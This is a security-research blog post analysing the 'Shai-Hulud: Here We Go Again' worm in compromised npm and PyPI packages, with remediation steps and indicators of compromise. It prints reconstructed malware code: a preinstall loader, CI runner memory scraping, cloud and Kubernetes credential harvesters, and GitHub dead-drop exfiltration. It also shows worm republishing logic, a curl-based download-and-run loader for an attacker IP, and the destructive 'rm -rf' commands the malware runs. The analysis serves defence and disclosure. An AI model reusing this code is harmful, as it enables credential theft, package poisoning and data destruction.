---
excerpt: "The JFrog Security Research team analyzed the Shai-Hulud: Here We Go Again package compromise spanning npm and PyPI, combining CI/CD credential theft, encrypted exfiltration, persistence, worm-like package propagation, and an updated PyPI credentials stealer."
title: "Shai-Hulud: Here We Go Again - Worm by TeamPCP Hits NPM and PyPI"
date: "May 12, 2026"
description: "JFrog Security Research Team"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/shai-hulud-here-we-go-again/image1.jpg
type: realTimePost
minutes: '13'
---

The JFrog Security Research team is analyzing the ongoing **Shai-Hulud: Here We Go Again** compromise, currently affecting more than **170 npm and 2 PyPI unique packages** (full list in Appendix) which in total are downloaded more than 200 million times per week. The npm packages contain a malicious `preinstall` loader and a large obfuscated JavaScript payload designed to run inside developer and CI/CD environments, steal credentials, exfiltrate them through redundant channels, and use the stolen access to publish additional compromised packages.  
The compromised PyPI packages have an import-time downloader that retrieves a remote Python payload from attacker-controlled infrastructure.

**Update:** The PyPI payload hosted at `hxxps[:]//83.142.209.194/transformers.pyz` has changed since our initial analysis. Earlier responses from the endpoint contained only TeamPCP attribution text, but the current Python zip application is a credential stealer that targets local files, cloud providers, Kubernetes, Vault, password managers, and developer tooling secrets before encrypting and exfiltrating the collected data.

**JFrog Curation customers using an Immaturity policy were fully protected from this attack** (no exposure window)**,** since all of the malicious packages were flagged in less than 24 hours after publication.

The most important aspect of this campaign is its **worm-like behavior and destructive dead-man switch.** Like previous Shai-Hulud attacks, the npm payload does not stop after stealing credentials from one machine or one build runner. It actively searches for npm publishing access, modifies package tarballs, bumps versions, injects malicious package metadata, and republishes infected artifacts. The PyPI malicious packages show the same campaign expanding into Python distribution channels through an import-time downloader. Together, these samples show how a compromised build environment can become a propagation point across ecosystems.

![](/img/RealTimePostImage/post/shai-hulud-here-we-go-again/image1.jpg)

## How The Compromise Happened

The observed attack chain started with code execution inside a trusted GitHub release environment. The attacker abused a workflow pattern that allowed fork-controlled code to run in a privileged repository context. This attack method is becoming more and more popular, due to npm’s “Trusted Publishing” defense mechanism, as also shown by the [13 similar vulnerabilities previously discovered](https://jfrog.com/blog/jfrog-ai-bot-stopped-shai-hulud-3/) and remediated by JFrog’s Research team. The injected code poisoned a build cache entry, and a later release workflow restored the poisoned cache during legitimate build activity. Tanstack, which was compromised, also [published a postmortem](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem) about this campaign.

This detail matters because the malicious package could still be published by a legitimate trusted-publishing identity. In other words, provenance can prove **where** an artifact was built, but it cannot prove that the build workflow was clean at runtime. If attacker-controlled code executes inside the trusted workflow before publishing, the resulting package can inherit the trust properties of that workflow while still containing malware.

Once running in the release environment, the malware extracted GitHub Actions OIDC material from runner memory. It then exchanged that material for npm publishing credentials and used those credentials to publish compromised versions. The payload later repeats the same pattern against other reachable packages, making the propagation logic part of the malware itself rather than a one-time attacker action.

## Payload Analysis \- npm Variant

## Initial Execution Through `preinstall`

The local package sample executes during installation through a root-level `preinstall` script:

```json
{
  "name": "@uipath/codedagent-tool",
  "version": "1.0.1",
  "files": ["dist"],
  "scripts": {
    "preinstall": "node setup.mjs"
  }
}
```

The `setup.mjs` file acts as a loader. It downloads the Bun runtime, extracts it into a temporary directory, marks the binary as executable, and uses that binary to run the JavaScript payload from the package directory.

```javascript
const bunVersion = "1.3.13";
const payloadName = "tanstack_runner.js";
const bunZipUrl = `https://github.com/oven-sh/bun/releases/download/bun-v${bunVersion}/${platformArchive}.zip`;

await download(bunZipUrl, temporaryZipPath);
extractBunBinary(temporaryZipPath, temporaryDirectory);
chmod(bunBinaryPath, 0o755);
execFileSync(bunBinaryPath, [path.join(packageDirectory, payloadName)], {
  cwd: packageDirectory,
  stdio: "inherit"
});
```

In the samples we analysed, `tanstack_runner.js` was absent while `router_init.js` was present. The `setup.mjs` hash matches the campaign loader, and the bundled `router_init.js` is the 2.3 MB malicious payload. This mismatch is useful for analysis because it shows the loader and payload names were reused across package variants.

### Obfuscation And Embedded Payloads

The payload is heavily obfuscated and tailored for Bun execution. The deobfuscated output still contains hundreds of secondary string-decoding calls and encrypted payload sections. One layer uses PBKDF2-SHA256 with the campaign salt `svksjrhjkcejg`, then derives stream keys from per-string IVs.

```javascript
const masterKey = pbkdf2Sync(inputKey, "svksjrhjkcejg", 200000, 32, "sha256");

function beautify(ciphertext) {
  const decoded = Buffer.from(ciphertext, "base64");
  const iv = decoded.subarray(0, 12);
  const encrypted = decoded.subarray(12);
  const streamKey = sha256(masterKey, iv);
  return xorDecode(encrypted, streamKey);
}
```

Another layer stores JavaScript payloads as AES-256-GCM encrypted, gzip-compressed blobs. These are decrypted at runtime and decompressed through Bun APIs, which makes the payload dependent on the runtime that the loader just downloaded.

```javascript
function decryptEmbeddedPayload(hexKey, base64Blob) {
  const key = Buffer.from(hexKey, "hex");
  const blob = Buffer.from(base64Blob, "base64");
  const iv = blob.subarray(0, 12);
  const authTag = blob.subarray(12, 28);
  const ciphertext = blob.subarray(28);

  const decipher = createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(authTag);
  const compressed = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  return new TextDecoder().decode(Bun.gunzipSync(compressed));
}
```

This design gives the npm malware two advantages. First, static scanners need to handle multiple decoding layers before reaching meaningful logic. Second, the package can keep its main functionality embedded locally, reducing its dependency on a second-stage download that might be blocked or taken down. The PyPI variant takes the opposite approach by using a compact loader that retrieves `transformers.pyz` from the network, showing that the campaign used different payload-delivery strategies per ecosystem.

### CI/CD Credential Theft

A major focus of the payload is GitHub Actions. The malware attempts to scrape runner process memory for secret values and OIDC material, including `ACTIONS_ID_TOKEN_REQUEST_TOKEN` and `ACTIONS_ID_TOKEN_REQUEST_URL`. These values are especially sensitive because they can be exchanged for short-lived publishing credentials in trusted-publishing workflows.

The runner memory scraping logic searches Linux runner memory for serialized secret objects marked with `"isSecret":true`:

```javascript
if (process.env.RUNNER_OS !== "Linux") {
  return failure("Not running on Linux runner");
}

const output = execSync(
  "sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u",
  { input: embeddedPythonMemoryScraper, encoding: "utf-8" }
);

const secrets = new Map();
for (const match of output.matchAll(/"([^"]+)":{"value":"([^"]*)","isSecret":true}/g)) {
  const [, name, value] = match;
  secrets.set(name, value);
}
```

This is the key step that connects the initial workflow compromise to package propagation. The payload is not only looking for long-lived tokens in files or environment variables. It is also attempting to recover runtime-only CI/CD secrets from the build process itself, including identity material that may never be written to disk.

The local sample targets several credential classes:

- GitHub tokens, including `ghp_`, `gho_`, legacy `ghs_` formats, JWT-shaped `ghs_` tokens, and tokens recovered from runner memory.  
- GitHub Actions secrets and OIDC request material.  
- npm tokens, including `npm_` tokens and trusted-publishing tokens minted through OIDC exchange.  
- AWS credentials from environment variables, shared credential files, ECS task metadata, EC2 IMDSv2, and web identity token files.  
- Kubernetes service account tokens, kubeconfig tokens, and Kubernetes API secrets across accessible namespaces.  
- HashiCorp Vault tokens from environment variables, local token files, mounted secret paths, and in-cluster authentication flows.  
- Local developer secrets, including cloud configs, `.npmrc`, Git credentials, shell histories, private keys, Docker authentication data, and generic API keys found by regex.

### Cloud And Cluster Harvesting

The payload includes dedicated harvesters for cloud and orchestration environments. The AWS harvester reads static environment variables and shared credential files, then attempts to query ECS and EC2 metadata services. In EC2 environments, it uses IMDSv2 to request a metadata token and retrieve role credentials.

```javascript
const staticCredentials = {
  accessKeyId: process.env.AWS_ACCESS_KEY_ID,
  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
  sessionToken: process.env.AWS_SESSION_TOKEN
};

const imdsToken = await fetch("http://169.254.169.254/latest/api/token", {
  method: "PUT",
  headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
  signal: AbortSignal.timeout(2000)
}).then(r => r.text());

const roleName = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
  headers: { "X-aws-ec2-metadata-token": imdsToken },
  signal: AbortSignal.timeout(2000)
}).then(r => r.text());
```

For Kubernetes, the malware reads the in-cluster service account token and namespace, then attempts to enumerate secrets in accessible namespaces. It also includes Vault-specific logic, looking for tokens in common environment variables and file paths and attempting Kubernetes-to-Vault authentication when an in-cluster Vault endpoint is available.

```javascript
const serviceAccountToken = readFile("/var/run/secrets/kubernetes.io/serviceaccount/token");
const namespace = readFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace") || "default";

const namespaces = await listNamespaces(serviceAccountToken);
for (const namespace of namespaces) {
  if (systemNamespaces.has(namespace)) continue;
  const secrets = await get(`/api/v1/namespaces/${namespace}/secrets`, serviceAccountToken);
  collectDecodedSecretData(secrets);
}

const vaultToken =
  process.env.VAULT_TOKEN ||
  process.env.VAULT_AUTH_TOKEN ||
  readFirstExisting(["~/.vault-token", "/vault/token", "/var/run/secrets/vault-token"]);
```

The breadth of these harvesters shows that the malware was designed for build systems, cloud workloads, and developer machines at the same time. A compromised package installed on a laptop may leak local secrets, while the same payload inside CI/CD can leak credentials that allow the malware to publish more packages.

### Exfiltration Channels

The local payload contains logic for encrypted credential upload through Session/Oxen infrastructure. It discovers service nodes through seed nodes at `seed1[.]getsession[.]org`, `seed2[.]getsession[.]org`, and `seed3[.]getsession[.]org`, using the `/json_rpc` path and the `get_n_service_nodes` method. It also contains upload logic for `hxxp[:]//filev2[.]getsession[.]org/file`, which returns a retrievable file identifier.

The sample also contains GitHub GraphQL behavior that can be used to write data or malicious files into repositories through `createCommitOnBranch` mutations. The commits use the author marker `claude@users.noreply.github.com`, which gives defenders a useful hunting indicator.

```javascript
const author = {
  name: "claude",
  email: "claude@users.noreply.github.com"
};

const mutation = `
  mutation CreateCommitOnBranch($input: CreateCommitOnBranchInput!) {
    createCommitOnBranch(input: $input) {
      commit { oid url }
    }
  }
`;

await githubGraphql(mutation, {
  input: { branch, message: { headline: "chore: update dependencies" }, fileChanges, expectedHeadOid }
});
```

The payload contains a second GitHub path that creates a new public repository under a stolen GitHub token and uses it as a dead drop for exfiltrated results. The campaign name is not present as a plain string in the source, but one decoded `beautify(...)` string resolves to the repository description **`Shai-Hulud: Here We Go Again`**.

```javascript
async function createDeadDropRepository(githubToken) {
  const repoName = generateDuneStyleName();

  const response = await fetch("hxxps[:]//api[.]github[.]com/user/repos", {
    method: "POST",
    headers: {
      Authorization: `Bearer ${githubToken}`,
      Accept: "application/vnd.github+json"
    },
    body: JSON.stringify({
      name: repoName,
      private: false,
      auto_init: true,
      description: "Shai-Hulud: Here We Go Again",
      has_discussions: false,
      has_issues: false,
      has_wiki: false
    })
  });

  return response.json();
}
```

![](/img/RealTimePostImage/post/shai-hulud-here-we-go-again/image2.png)

After the repository is created, the malware commits JSON envelopes under a `results/` path. If the payload decides to include a stolen GitHub token in the envelope, the commit message is derived from the decoded threat string `IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner` (an actual true threat\!). Otherwise \- it uses a generic commit message.

```javascript
async function commitExfiltratedResults(repo, githubToken, envelope) {
  const filename = `results/results-${Date.now()}-${counter++}.json`;
  const commitMessage = envelope.token
    ? `IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner:${envelope.token}`
    : "Add files.";

  await fetch(`hxxps[:]//api[.]github[.]com/repos/${repo.owner}/${repo.name}/contents/${filename}`, {
    method: "PUT",
    headers: {
      Authorization: `Bearer ${githubToken}`,
      Accept: "application/vnd.github+json"
    },
    body: JSON.stringify({
      message: commitMessage,
      content: Buffer.from(JSON.stringify(envelope)).toString("base64")
    })
  });
}
```

The same GitHub write capability is also used to create a Dependabot-like branch and add `.github/workflows/codeql_analysis.yml` to accessible repositories. This gives the malware a repository-poisoning path in addition to dead-drop exfiltration.

```javascript
await createBranch({
  branch: "dependabot/github_actions/format/setup-formatter",
  from: defaultBranchHead
});

await putFile({
  path: ".github/workflows/codeql_analysis.yml",
  branch: "dependabot/github_actions/format/setup-formatter",
  message: "Add CodeQL Analysis",
  content: encodedWorkflowPayload
});
```

This redundant exfiltration design is significant. If direct file upload is blocked, repository writes may still work in environments where stolen GitHub tokens have “commit” access. If repository writes fail, the Session/Oxen file path still gives the attacker another route for credential collection.

**The payload implements a destructive `gh-token-monitor` that functions as a dead-man’s switch**. It installs the monitor script under `~/.local/bin` and achieves persistence via a Linux systemd user service or macOS LaunchAgent. The monitor then polls `hxxps[:]//api[.]github[.]com/user` every 60 seconds using a stolen GitHub token. If the API returns any `40x` response—indicating the token has been revoked—the monitor executes a configured handler, which in this variant decodes to `rm -rf ~/`. Consequently, **defenders must prioritize host isolation and persistence removal** before initiating the revocation of exposed GitHub tokens.

### Worm-Like npm Propagation And Ecosystem Spread

The propagation logic is what makes this campaign especially dangerous. After collecting npm tokens or trusted-publishing credentials, the payload identifies packages the victim can publish, downloads the current package tarballs, rewrites their metadata, bumps the patch version, and publishes the modified archives.

```javascript
async function propagateWithNpmToken(npmToken) {
  const tokenInfo = await fetch("https://registry.npmjs.org/-/npm/v1/tokens", {
    headers: { Authorization: `Bearer ${npmToken}` }
  }).then(r => r.json());

  const publishablePackages = await findPackagesWritableByToken(tokenInfo);

  for (const packageName of publishablePackages) {
    const tarball = await downloadLatestPackageTarball(packageName);
    const infectedTarball = await rewriteTarball(tarball, packageJson => {
      packageJson.optionalDependencies = {
        "@tanstack/setup": "github:tanstack/router#7369ea207ab53c50b2c670b6aede19169541b7ed"
      };
      packageJson.version = bumpPatch(packageJson.version, 3);
    });

    await npmPublish(infectedTarball, npmToken);
  }
}
```

The payload also includes logic for trusted-publishing propagation. In a GitHub Actions context, it can request an OIDC token for the npm registry audience and exchange it for an npm package publishing token. This lets the malware publish under the same workflow trust model that legitimate maintainers use.

```javascript
async function propagateWithGitHubOidc(packageName, infectedTarball) {
  const oidc = await fetch(
    `${process.env.ACTIONS_ID_TOKEN_REQUEST_URL}&audience=npm:registry.npmjs.org`,
    { headers: { Authorization: `bearer ${process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN}` } }
  ).then(r => r.json());

  const npmPublishToken = await exchangeOidcForNpmPackageToken(oidc.value, packageName);
  await npmPublish(infectedTarball, npmPublishToken);
}
```

This creates a feedback loop. The first compromised package runs in a privileged environment, extracts credentials, publishes infected packages, and waits for those packages to run in the next set of privileged environments. Each successful infection can create more publishing opportunities, which is why the payload should be treated as a worm rather than a standalone stealer.

### Persistence And Background Execution

The local payload daemonizes itself by relaunching the current process with a `__DAEMONIZED=1` environment guard, detached stdio, and `unref()`. This allows the install process to return while credential harvesting continues in the background.

```javascript
if (!process.env.__DAEMONIZED) {
  const child = spawn(process.execPath, process.argv.slice(1), {
    detached: true,
    stdio: "ignore",
    cwd: process.cwd(),
    env: { ...process.env, __DAEMONIZED: "1" }
  });

  child.unref();
  process.exit(0);
}

await runHarvesters([
  filesystemHarvester,
  shellHarvester,
  githubRunnerHarvester,
  awsSecretsManagerHarvester,
  awsSsmHarvester,
  kubernetesHarvester,
  vaultHarvester
]);
```

Campaign persistence indicators include dropped runtime files, editor or AI-tooling hook files, and an OS-level `gh-token-monitor` service on macOS or Linux (see IOCs below). Environments that installed a malicious package should therefore be treated as fully compromised until persistence is removed and credentials are rotated.

## PyPI Variant: Import-Time Downloader

The compromised PyPI package `mistralai@2.4.6` uses a different execution trigger. Instead of an npm lifecycle script, the injected code is placed in `mistralai/client/__init__.py`, which means ordinary imports of the SDK can trigger the malicious path. The package keeps its normal generated SDK functionality, making the injected loader easier to miss during casual inspection. In the local wheel, the Azure and GCP client initializers remain clean; the malicious import hook appears only in the standard client initializer.

The loader is Linux-only and uses an environment guard named `MISTRAL_INIT` to avoid repeated execution in the same process tree. It then prepares a download path under `/tmp`:

```py
import sys as _sys
import subprocess as _sub
import os as _os

def _run_background_task():
    if not _sys.platform.startswith("linux") or _os.environ.get("MISTRAL_INIT"):
        return

    _os.environ["MISTRAL_INIT"] = "1"
    _url = "hxxps[:]//83.142.209.194/transformers.pyz"
    _dest = "/tmp/transformers.pyz"
```

The package then downloads the remote payload from `hxxps[:]//83.142.209.194/transformers.pyz` with `curl -k`, disabling TLS certificate verification. It follows redirects, suppresses output, and starts the downloaded file with the current Python interpreter as a detached background process:

```py
try:
    if not _os.path.exists(_dest):
        _sub.run(["curl", "-k", "-L", "-s", _url, "-o", _dest], timeout=15)

    if _os.path.exists(_dest):
        _sub.Popen(
            [_sys.executable, _dest],
            stdout=_sub.DEVNULL,
            stderr=_sub.DEVNULL,
            start_new_session=True,
            env=_os.environ.copy()
        )
except:
    pass
```

Finally, the function is invoked unconditionally at import time:

```py
_run_background_task()
```

In our initial analysis, the locally downloaded `transformers.pyz` sample contained only the text response `teampcp says hello-ohh-ohh-ohhh`. That remote payload has since changed. The current `transformers.pyz` is a self-contained Python zip application that functions as a credential stealer and exfiltration tool, confirming the risk of a compact import-time downloader whose payload can be swapped after publication.

### Updated PyPI Payload: Python Credential Stealer

The updated payload begins with several anti-analysis and targeting gates. It runs only on Linux, exits on Russian locales, rejects low-CPU environments that may indicate sandboxes, and redirects output to `/dev/null` unless a debug environment variable is present. If the `cryptography` dependency is missing, the payload attempts to install it silently before proceeding.

```py
if sys.platform not in ("linux"):
    sys.exit(1)

if lang.lower().startswith("ru"):
    sys.exit(1)

if cpu_count is None or cpu_count <= 2:
    sys.exit(1)
```

The C2 configuration is hardcoded and disguised as machine-learning API paths. TLS verification is intentionally disabled, allowing the malware to communicate with attacker infrastructure even when a self-signed or otherwise invalid certificate is presented.

```py
EARLY_QUARANTINE_URL = "hxxps[:]//83.142.209.194/v1/models"
RUN_FOR_COVER = "hxxps[:]//83.142.209.194/audio.mp3"
TARGET_URL = "hxxps[:]//83.142.209.194/v1/weights"
IGNORE_SSL_ERRORS = True
```

Credential collection is broad. The payload reads local credential files such as `~/.aws/credentials`, `~/.kube/config`, `~/.config/gh/hosts.yml`, shell histories, SSH keys, `.env` files, Terraform state files, Docker container environment variables, Tailscale state, and WireGuard configuration. It also targets AI and developer tooling configuration files, including Cursor MCP configuration, VS Code MCP configuration, Claude Desktop configuration, Continue, Codeium, OpenCode, Kilo, and Zed settings.

The cloud collectors cover AWS, GCP, Azure, Kubernetes, and HashiCorp Vault. The AWS collector resolves credentials from environment variables, IMDS, and shared credential files, then enumerates Secrets Manager and SSM Parameter Store values across multiple regions. The GCP collector uses service-account or authorized-user credentials to read Secret Manager entries, while the Azure collector lists subscriptions, Key Vaults, and secrets. The Kubernetes collector reads `~/.kube/config`, falls back to in-cluster service account tokens, and can download `kubectl` to `/tmp/kubectl` before extracting secrets across namespaces. The Vault collector resolves tokens from common locations and recursively dumps KV secrets.

The payload also targets password managers. It attempts to dump 1Password vaults through the `op` CLI, Bitwarden items when the vault is unlocked, and entries from `pass` and `gopass`. This makes the PyPI payload closer in intent to the npm stealer than the initial attribution-only response suggested, but with a Python implementation and an ecosystem-specific import trigger.

### PyPI Exfiltration And Fallback Channels

After collection, the payload serializes the stolen data to JSON, compresses it, encrypts the bundle with AES-256-GCM, and wraps the AES key with an embedded RSA public key using RSA-OAEP-SHA256. Only the attacker-controlled private key can decrypt the resulting envelope.

```py
aes_key = os.urandom(32)
iv = os.urandom(12)
encrypted_key = rsa_oaep_encrypt_sha256(config.PUBLIC_KEY_PEM, aes_key)
ciphertext, tag = aes_256_gcm_encrypt(aes_key, iv, compressed)
```

The primary exfiltration path is an HTTP POST to `hxxps[:]//83.142.209.194/v1/weights`. If that fails, the payload searches GitHub commits for the keyword `FIRESCALE`, extracts a signed base64url payload from matching commit messages, verifies it with the attacker's RSA public key, and uses the verified URL as a fallback C2. This gives the attacker a dead-drop C2 resolution mechanism that can survive static blocklists against the original IP.

The Python payload also includes a GitHub exfiltration fallback. When stolen GitHub tokens are found in the collected data, it can create a public repository under the victim account and upload the encrypted bundle as `results.json`. The repository description is hardcoded as `PUSH UR T3MPRR`, giving defenders another hunting indicator.

### PyPI Persistence And Destructive Second Stage

The early-quarantine endpoint at `hxxps[:]//83.142.209.194/v1/models` can deliver a secondary base64-encoded Python stage. That stage writes a decoded payload to `~/.local/bin/pgmonitor.py`, or `/usr/bin/pgmonitor.py` when running as root, and installs a systemd service named `pgsql-monitor.service` to masquerade as a PostgreSQL monitoring daemon.

The second stage also contains geofenced destructive behavior. It checks timezone and locale markers associated with Israel and Iran, including `Jerusalem`, `Tel_Aviv`, `Tehran`, `he_IL`, and `fa_IR`. On matching systems, a one-in-six random branch downloads `hxxps[:]//83.142.209.194/audio.mp3`, attempts to play it at full volume, and then executes `rm -rf /*`. Although this destructive branch is probabilistic, affected Linux hosts should be treated as fully compromised after importing the malicious PyPI package.

## How did JFrog Curation protect against this attack?

JFrog Curation customers using an immaturity policy were fully protected from this attack, as all of the hijacked packages were flagged in less than 24 hours. Curation has automatic compliance version selection (CVS) mechanism to ensure developer and CI/CD seamless fullback to compliant none latest versions until cool.

## Remediation

Prior to the revocation of GitHub tokens, **it is critical to eliminate the malware’s dead-man switch mechanisms.**   
For **Linux environments**, administrators should stop and disable the user-level service and purge its associated files by executing:

-  `systemctl --user stop gh-token-monitor.service`  
-  `systemctl --user disable gh-token-monitor.service`, 

followed by the removal of:

- `~/.config/systemd/user/gh-token-monitor.service`  
- `~/.local/bin/gh-token-monitor.sh`  
- `~/.config/gh-token-monitor/`

On **macOS**, the LaunchAgent must be unloaded via:  
`launchctl bootout "gui/$(id -u)" ~/Library/LaunchAgents/com.user.gh-token-monitor.plist`

followed by the removal of:

- `~/Library/LaunchAgents/com.user.gh-token-monitor.plist`  
- `~/.local/bin/gh-token-monitor.sh`  
- `~/.config/gh-token-monitor/`

For environments exposed to the updated **PyPI payload**, administrators should also stop and disable the PostgreSQL-masquerading service if present:

- `systemctl stop pgsql-monitor.service`
- `systemctl disable pgsql-monitor.service`
- `systemctl --user stop pgsql-monitor.service`
- `systemctl --user disable pgsql-monitor.service`

followed by the removal of:

- `~/.config/systemd/user/pgsql-monitor.service`
- `/etc/systemd/system/pgsql-monitor.service`
- `~/.local/bin/pgmonitor.py`
- `/usr/bin/pgmonitor.py`

Once the removal of the npm and PyPI persistence mechanisms is verified, proceed to rotate all compromised GitHub tokens and associated credentials.

- Remove the malicious packages from affected projects. For npm projects, run `npm uninstall <package name>` and inspect lockfiles for malicious transitive entries. For Python environments, run `pip uninstall <package name>` and reinstall only a verified clean version.  
- Avoid unnecessary package upgrades in the coming days, as additional malicious packages may still be published as part of this ongoing campaign.  
- Isolate affected developer machines and CI/CD runners before revoking tokens. Persistence should be removed before credential rotation to prevent active malware from reacting to token changes.  
- Rotate GitHub tokens, npm tokens, GitHub Actions secrets, cloud credentials, Kubernetes service account tokens, Vault tokens, SSH keys, Docker credentials, and any secrets present in the affected environment.  
- Search your GitHub Personal and Organization accounts for `Shai-Hulud: Here We Go Again` to find exfiltrated credentials  
- Review GitHub repositories for suspicious commits authored as `claude@users.noreply.github.com` or Dependabot-like branch names that do not match expected automation.  
- Remove persistence artifacts such as `.claude/settings.json`, `.vscode/tasks.json`, dropped `setup.mjs` or `router_runtime.js` files, `gh-token-monitor` LaunchAgent or systemd entries, and PyPI payload artifacts such as `pgsql-monitor.service` and `pgmonitor.py`.
- Block network access to campaign infrastructure, including `filev2[.]getsession[.]org`, `seed1[.]getsession[.]org`, `seed2[.]getsession[.]org`, `seed3[.]getsession[.]org`, `git-tanstack[.]com`, `api[.]masscan[.]cloud`, `83.142.209.194`, `hxxps[:]//83.142.209.194/transformers.pyz`, `hxxps[:]//83.142.209.194/v1/models`, `hxxps[:]//83.142.209.194/v1/weights`, and `hxxps[:]//83.142.209.194/audio.mp3`.
- Rebuild affected CI/CD runners from clean images and invalidate caches that may have been restored by release workflows.

## Conclusions

Shai-Hulud: Here We Go Again is another attack campaign by TeamPCP. Like previous Shai-Hulud attacks, this campaign acts as a propagating worm, with credential exfiltration to GitHub and other attacker-controlled channels. The updated PyPI payload is no longer only an attribution response. It is now a credential stealer with cloud, Kubernetes, Vault, password-manager, and developer-tooling collectors, plus persistence and destructive second-stage behavior.

The attack also shows why package provenance must be interpreted carefully. A valid build attestation can still describe a malicious artifact if the attacker gained execution inside the trusted workflow before the package was produced. Defenders should therefore monitor both package metadata and the runtime behavior of release workflows, especially cache restoration, fork-triggered automation, and OIDC token use.

These malicious packages are detected by JFrog Xray and JFrog Curation.

## IOCs

### Network IOCs

- `hxxp[:]//filev2[.]getsession[.]org/file/` \- encrypted credential upload and retrieval path  
- `hxxps[:]//83.142.209.194/transformers.pyz` \- PyPI remote payload URL  
- `hxxps[:]//83.142.209.194/v1/models` \- PyPI second-stage retrieval endpoint
- `hxxps[:]//83.142.209.194/v1/weights` \- PyPI credential exfiltration endpoint
- `hxxps[:]//83.142.209.194/audio.mp3` \- PyPI destructive second-stage media download
- `seed1[.]getsession[.]org`, `seed2[.]getsession[.]org`, `seed3[.]getsession[.]org` \- Session/Oxen seed nodes  
- `/json_rpc` with `get_n_service_nodes` \- Session service-node discovery path  
- `hxxps[:]//api[.]github[.]com/search/commits?q=FIRESCALE` \- PyPI fallback C2 discovery through signed GitHub commit messages
- `hxxps[:]//api[.]github[.]com/user/repos` \- creates public GitHub dead-drop repositories  
- `hxxps[:]//api[.]github[.]com/repos/<owner>/<repo>/contents/results/` \- commits exfiltrated result JSON to GitHub dead-drop repositories  
- `hxxps[:]//api[.]github[.]com/graphql` \- `createCommitOnBranch` repository write path  
- `git-tanstack[.]com` \- campaign infrastructure  
- `api[.]masscan[.]cloud` \- campaign infrastructure  
- `83.142.209.194` \- campaign infrastructure

### Hashes

- NPM payloads:  
  - 29c729852fce5a53e30a1541d9fec79c915b2e13f1eda94a5978cf0aae0d88d9  
  - 2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96  
  - ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c  
  - D4a2086ea18f5e39cd867b8b06918a524eabb21d45ea98aad07357b98173458a  
- PyPI payload \_\_init\_\_.py:  
  - 2a314ea8be337e1ca9ec833ed13ed854d9fd38bce0a519cf288f3bec8d9e6f30
- Updated PyPI `transformers.pyz` payload:
  - 5245eb032e336b85cff0dbb3450d591826bf2ef214fd30d7eba1a763664e151b

### Files

- `/tmp/transformers.pyz` \- PyPI downloaded payload path  
- `~/.local/bin/pgmonitor.py` \- PyPI second-stage persistence payload
- `/usr/bin/pgmonitor.py` \- PyPI second-stage persistence payload when running as root
- Linux dead-man switch:  
  - `~/.config/systemd/user/gh-token-monitor.service`  
  - `~/.local/bin/gh-token-monitor.sh`  
  - `~/.config/gh-token-monitor/`  
- MacOS dead-man switch:  
  - `~/Library/LaunchAgents/com.user.gh-token-monitor.plist`  
  - `~/.local/bin/gh-token-monitor.sh`  
  - `~/.config/gh-token-monitor/`

### Other Indicators

- `Shai-Hulud: Here We Go Again` \- decoded GitHub dead-drop repository description  
- `PUSH UR T3MPRR` \- PyPI GitHub exfiltration repository description
- `FIRESCALE` \- PyPI fallback C2 discovery keyword in GitHub commit search
- `pgsql-monitor.service` \- PyPI second-stage systemd persistence service
- Linux Dead-man switch service \- `gh-token-monitor.service`  
- MacOS Dead-man switch plist \- `~/Library/LaunchAgents/com.user.gh-token-monitor.plist`

## Appendix A: npm Compromised Package Versions

| type | XrayID | Version |
| :---- | :---- | :---- |
| @beproduct/nestjs-auth | XRAY-981605 | 0.1.18;0.1.19;0.1.17;0.1.16;0.1.15;0.1.13;0.1.14;0.1.8;0.1.6;0.1.9;0.1.2;0.1.5;0.1.11;0.1.4;0.1.3;0.1.7;0.1.10;0.1.12 |
| @dirigible-ai/sdk | XRAY-981587 | 0.6.3;0.6.2 |
| @draftauth/client | XRAY-981621 | 0.2.2;0.2.1 |
| @draftauth/core | XRAY-981600 | 0.13.1;0.13.2 |
| @draftlab/auth | XRAY-981565 | 0.24.2;0.24.1 |
| @draftlab/auth-router | XRAY-981599 | 0.5.1;0.5.2 |
| @draftlab/db | XRAY-981569 | 0.16.2;0.16.1 |
| @mesadev/rest | XRAY-981764 | 0.28.3 |
| @mesadev/saguaro | XRAY-981773 | 0.4.22 |
| @mesadev/sdk | XRAY-981754 | 0.28.3 |
| @mistralai/mistralai | XRAY-981767 | 2.2.4;2.2.3;2.2.2 |
| @mistralai/mistralai-azure | XRAY-981787 | 1.7.3;1.7.1;1.7.2 |
| @mistralai/mistralai-gcp | XRAY-981783 | 1.7.3;1.7.1;1.7.2 |
| @ml-toolkit-ts/preprocessing | XRAY-981622 | 1.0.2;1.0.3 |
| @ml-toolkit-ts/xgboost | XRAY-981630 | 1.0.3;1.0.4 |
| @opensearch-project/opensearch | XRAY-981790 | 3.5.3;3.8.0;3.7.0;3.6.2 |
| @squawk/airport-data | XRAY-981753 | 0.7.8;0.7.7;0.7.6;0.7.5;0.7.4 |
| @squawk/airports | XRAY-981785 | 0.6.6;0.6.5;0.6.4;0.6.3;0.6.2 |
| @squawk/airspace | XRAY-981774 | 0.8.5;0.8.3;0.8.4;0.8.2;0.8.1 |
| @squawk/airspace-data | XRAY-981671 | 0.5.7;0.5.5;0.5.6;0.5.4;0.5.3 |
| @squawk/airway-data | XRAY-981770 | 0.5.8;0.5.7;0.5.6;0.5.5;0.5.4 |
| @squawk/airways | XRAY-981786 | 0.4.6;0.4.4;0.4.5;0.4.3;0.4.2 |
| @squawk/fix-data | XRAY-981762 | 0.6.8;0.6.7;0.6.6;0.6.5;0.6.4 |
| @squawk/fixes | XRAY-981768 | 0.3.6;0.3.5;0.3.4;0.3.3;0.3.2 |
| @squawk/flight-math | XRAY-981761 | 0.5.8;0.5.7;0.5.6;0.5.5;0.5.4 |
| @squawk/flightplan | XRAY-981755 | 0.5.6;0.5.5;0.5.4;0.5.3;0.5.2 |
